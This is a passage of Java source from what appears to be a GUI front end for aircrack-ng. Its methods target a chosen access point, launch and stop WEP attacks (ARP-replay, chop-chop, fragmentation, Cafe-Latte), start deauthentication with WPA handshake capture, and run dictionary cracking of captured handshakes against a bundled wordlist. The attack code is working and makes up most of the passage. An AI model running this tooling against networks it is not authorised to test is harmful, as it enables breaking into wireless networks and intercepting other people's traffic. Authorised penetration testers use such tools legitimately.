				pro1 = Runtime.getRuntime().exec(fixArgumentsPath(
					xterm + "airodump-ng -w !PATH!wep --bssid " + currentBSSID + " -c " + currentChannel + " --ivs --output-format csv " + drv));
			} catch (IOException e) {
				e.printStackTrace();
			} catch (InterruptedException ex) {
				ex.printStackTrace();
			}
			
			// to turn off, set wepattack1.flag = true;
		} else {
			setEnable(true);
			
			buttonStart.setLabel("Start Attack");
			pro1.destroy();
			wepattack1.flag = true;
			try {
				// kill aireplay -- stuck on listening for packets!
				wepattack1.profrag.destroy(); 
			} catch(NullPointerException npe) {
				npe.printStackTrace();
			}
			String att = "";
			switch(wepattack.getSelectedIndex()) {
			case 1: att = "ARP-Replay";
				break;
			case 2: att = "Chop-Chop";
				break;
			case 3: att = "Fragmentation";
				break;
			case 4: att = "Cafe-Latte";
				break;
			case 5: att = "p0841";
				break;
			}
			stat(att + " Attack Stopped");
		}
	}
	public void wpaCrack() {
		// method runs whenever Start/Stop Cracking button is clicked
		// assumes handshake is in cap file: wpa-01.cap
		if (wpacrack.getLabel().equals("Crack WPA (Dictionary Attack)")) {
			// user selected to begin cracking
			wpacrack.setLabel("Stop Cracker");
			
			try {
				// remove old 'wpacracked.txt' file so we don't get a false-positive
				procrack = Runtime.getRuntime().exec(fixArgumentsPath("rm -rf !PATH!wpacracked.txt"));
				procrack.waitFor();
				procrack.destroy();
				
				// the below code attempts to locate the user-selected path to the wordlist
				// if the path is invalid [file not found] it uses the default wordlist
				String wordlist = wpawordlist.getText();
				
				// get rid of \'s (for spaces)
				wordlist = wordlist.replaceAll("\\\\", "");
				
				if (fileExists(wordlist) == false) {
					// wordlist doesn't exist, use this default one
					wordlist = grimwepaPath + "default_pw.txt";
					
					if (fileExists(wordlist) == false)
						generatePasswords();
					wpawordlist.setText(grimwepaPath + "default_pw.txt");
					stat("Cracking WPA, using default wordlist");
				} else {
					wpawordlist.setText(wordlist);
					stat("Cracking WPA, using '" + wordlist + "'");
				}
				wordlist = wordlist.replaceAll(" ", "\\ ");
				
				String xterm;
				if (hideWin.isSelected() == true)
					xterm = "";
				else
					xterm = "xterm -fg green -bg black -geom 80x20+0+0 -e ";
				
				String[] blah = fixArgumentsPath(xterm + "aircrack-ng -a 2 -w !WORDLIST! " + 
					"-l !PATH!wpacracked.txt !PATH!wpa-01.cap");
				for (int i = 0; i < blah.length; i++) {
					if (blah[i].indexOf("!WORDLIST!") >= 0) {
						blah[i] = wordlist;
					}
					// System.out.print(blah[i] + " ");
				}
				// System.out.println();
				
				procrack = Runtime.getRuntime().exec(blah);
				// procrack = Runtime.getRuntime().exec(fixArgumentsPath(xterm + "aircrack-ng -a 2 -l " + 
				// 		"!PATH!wpacracked.txt -w " + wordlist + " !PATH!wpa-01.cap"));
				/* BufferedReader br = new BufferedReader(new InputStreamReader(procrack.getInputStream()));
				
				String line = null;
				while ( (line = br.readLine()) != null) {
					System.out.println(line);
				}
				*/
				
				// procrack.waitFor();
			} catch (IOException e) {
				e.printStackTrace();
			} catch (InterruptedException ie) {
				ie.printStackTrace();
			}
			
			wpacracker wpac = new wpacracker();
			wpac.t.start();
		} else {
			wpacracker.flag = true;
		}
	}
	public boolean fileExists(String file) {
		File f = new File(file);
		return f.exists();
	}
	public void generateReadme() {
		// extracts readme file from the program's JAR file
		try {
			String home = getClass().getProtectionDomain()
                   			.getCodeSource().getLocation()
                      			.getPath().replaceAll("%20", " ");
			JarFile jar = new JarFile(home);
			ZipEntry entry = jar.getEntry("README");
			File efile = new File(grimwepaPath, entry.getName());
			
			InputStream in = 
				new BufferedInputStream(jar.getInputStream(entry));
			OutputStream out = 
				new BufferedOutputStream(new FileOutputStream(efile));
			byte[] buffer = new byte[2048];
			for (;;)  {
				int nBytes = in.read(buffer);
				if (nBytes <= 0) break;
				out.write(buffer, 0, nBytes);
			}
			out.flush();
			out.close();
			in.close();
		}
		catch (Exception e) {
			e.printStackTrace();
		}
	}
	public void generateInstall() {
		// extracts grimstall.sh file from the program's JAR file
		try {
			String home = getClass().getProtectionDomain()
                   			.getCodeSource().getLocation()
                      			.getPath().replaceAll("%20", " ");
			JarFile jar = new JarFile(home);
			ZipEntry entry = jar.getEntry("grimstall.sh");
			File efile = new File(grimwepaPath + entry.getName());
			
			InputStream in = 
				new BufferedInputStream(jar.getInputStream(entry));
			OutputStream out = 
				new BufferedOutputStream(new FileOutputStream(efile));
			byte[] buffer = new byte[2048];
			for (;;)  {
				int nBytes = in.read(buffer);
				if (nBytes <= 0) break;
				out.write(buffer, 0, nBytes);
			}
			out.flush();
			out.close();
			in.close();
		}
		catch (Exception e) {
			e.printStackTrace();
		}
	}
	public void generatePasswords() {
		// this method USED to randomly create a bunch of WPA-style passwords...
		// now it extracts the default password list ("default_pw.txt") from the jar file!
		// it copies the default_pw.txt file to the current working directory. 
		try {
			String home = getClass().getProtectionDomain()
                   			.getCodeSource().getLocation()
                      			.getPath().replaceAll("%20", " ");
			JarFile jar = new JarFile(home);
			ZipEntry entry = jar.getEntry("default_pw.txt");
			File efile = new File(grimwepaPath, entry.getName());
			
			InputStream in = 
				new BufferedInputStream(jar.getInputStream(entry));
			OutputStream out = 
				new BufferedOutputStream(new FileOutputStream(efile));
			byte[] buffer = new byte[2048];
			for (;;)  {
				int nBytes = in.read(buffer);
				if (nBytes <= 0) break;
				out.write(buffer, 0, nBytes);
			}
			out.flush();
			out.close();
			in.close();
		}
		catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	public void wpaAttack() {
		// this method is called when the Start Deauth + Handshake button is pressed
		if (wpadeauth.getLabel().equals("Start Deauth + Handshake Capture Attack") == true) {
			// if we are supposed to be deauthing...
			
			wpadeauth.setLabel("Stop Deauth + Handshake Attack");
			setEnable(false);
			wpadeauth.setEnabled(true);
			
			try {
				// remove old wpa capture file
				pro1 = Runtime.getRuntime().exec(fixArgumentsPath("rm -rf !PATH!wpa-01.cap"));
				pro1.waitFor();
				pro1.destroy();
				
				// find the wifi card
				String drv = (String)drivers.getItemAt(drivers.getSelectedIndex());
				
				// xterm is blank if we aren't going to display the xterm win
				String xterm;
				if (hideWin.isSelected() == true)
					xterm = "";
				else
					xterm = "xterm -fg green -bg black -geom 100x15+0+0 -e ";
				
				// run airodump, saved to a pcap file, targetting the bssid/channel
				pro1 = Runtime.getRuntime().exec(fixArgumentsPath(xterm + "airodump-ng -w !PATH!wpa --bssid " + 
						currentBSSID + " -c " + currentChannel + " --output-format pcap " + drv));
			} catch (IOException e) {
				e.printStackTrace();
			} catch (InterruptedException ex) {
				ex.printStackTrace();
			}
			
			// load new 'scripter' aka class that looks for a handshake in the pcap file
			scripter s = new scripter();
			s.t.start();
			// to turn off, set scripter.flag = true;
		} else {
			// user clicked STOP
			setEnable(true);
			wpadeauth.setLabel("Start Deauth + Handshake Capture Attack");
			scripter.flag = true; // tells class to stop
		}
	}
	
	public void addTargetsToList() {
		// uses targetClass.java to load AP's found in airodump CSV file into the list
		// the loop in targetClass waits for the button to say 'Refresh Targets' to end the loop
		test2.targetsm.setRowCount(0);
		setEnable(false);
		targets.setEnabled(true);
		buttonTargets.setEnabled(true);
		
		buttonTargets.setLabel("Stop scanning");
		
		tc = new targetClass();
		tc.t.start();
	}
	public static void stat(String upd8) {
		// simple statusbar updater; blank=inactive!
		if (upd8.equals("") == true)
			status.setText(" Status: [inactive]");
		else
			status.setText(" Status: [" + upd8 + "]");
	}
	
	public static boolean isValidDriver(String name) {
		// checks if 'name' is a valid wifi interface aka IS IN MONITOR MODE!!
		// program was *locking up the computer entirely* when trying
		//   to run airodump with a non-monitor mode wifi interface
		// this fixed it.
		
		Process proDrv;
		BufferedReader res1;
		boolean flag = false;
		
		try {
			proDrv = Runtime.getRuntime().exec("iwconfig " + name);
			res1 = new BufferedReader(new InputStreamReader(proDrv.getInputStream()));
			proDrv.waitFor(); // wait for data
			
			String line;
			while ((line = res1.readLine()) != null) {
				if (line.indexOf("Mode:Monitor") >= 0) {
					flag = true;
					break;
				}
	}
			proDrv.destroy();
		} catch (InterruptedException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		}
		
		return flag;
	}
	
	public static void addDriversToList() throws IOException {
		// enums list of wifi interfaces into the "drivers" combobox
		// only adds wifi interfaces that are already in monitor mode.
		Process proDrv;
		BufferedReader res1;
		String drv;
		
		/*
		while (drivers.getItemCount() > 0) {
			drivers.removeItemAt(0);
			pause(0.001);
		}*/
		drivers.removeAllItems();
		
		drivers.addItem("WiFi Device:");
		try {
			proDrv = Runtime.getRuntime().exec("airmon-ng");
			res1 = new BufferedReader(new InputStreamReader(proDrv.getInputStream()));
			proDrv.waitFor(); // wait for data
			
			String line;
			while ((line = res1.readLine()) != null) {
				if ((line.indexOf("Interface") < 0) && (line.equals("") == false)) {
					drv = line.substring(0, line.indexOf("\t"));
					if (isValidDriver(drv) == true)
						drivers.addItem(drv);
				}
			}
			proDrv.destroy();
		} catch (InterruptedException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
	
	public static void pause(double dtime) {
		// pauses for selected period of time (IN SECONDS)
		try {
			Thread.currentThread().sleep((int)(dtime * 1000));
		} catch (InterruptedException e) {
			e.printStackTrace();
		}
	}
	
	public void windowClosing(WindowEvent e) {
		// event : when main window is told to close [exit]
		dispose();
		try {
			// if we're still looking for targets, stop!!!
			if (tc != null) {
				if (tc.t.isAlive() == true) {
					buttonTargets.setLabel("Refresh Targets");
					try {
						tc.t.join();
					} catch (InterruptedException derp) {
						derp.printStackTrace();
					}
				}
			}
		} catch (NullPointerException ex) {
			ex.printStackTrace();
		}
		
		// save settings
		saveSettings();
		
		// gtfo
		System.exit(0);
	}
	public static String[] fixArgumentsPath(String args) {
		// converts a string of arguments (separated by spaces) into an array
		// it also replaces the string "!PATH!" that's in an argument with the program's working dir.
		// this is so we can have paths that contain a space!! :D
		// this took me a while to figure out, but I think i got it! :D
		String[] blah = args.split(" ");
		for (int i = 0; i < blah.length; i++) {
			if (blah[i].startsWith("!PATH!") == true) {
				blah[i] = test2.grimwepaPath + blah[i].substring(6);
			}
		}
		return blah;
	}
	
	// no idea, but it works!
	public void windowOpened(WindowEvent e) {}
	public void windowActivated(WindowEvent e) {}
	public void windowIconified(WindowEvent e) {}
	public void windowDeiconified(WindowEvent e) {}
	public void windowDeactivated(WindowEvent e) {}
	public void windowClosed(WindowEvent e) {}

}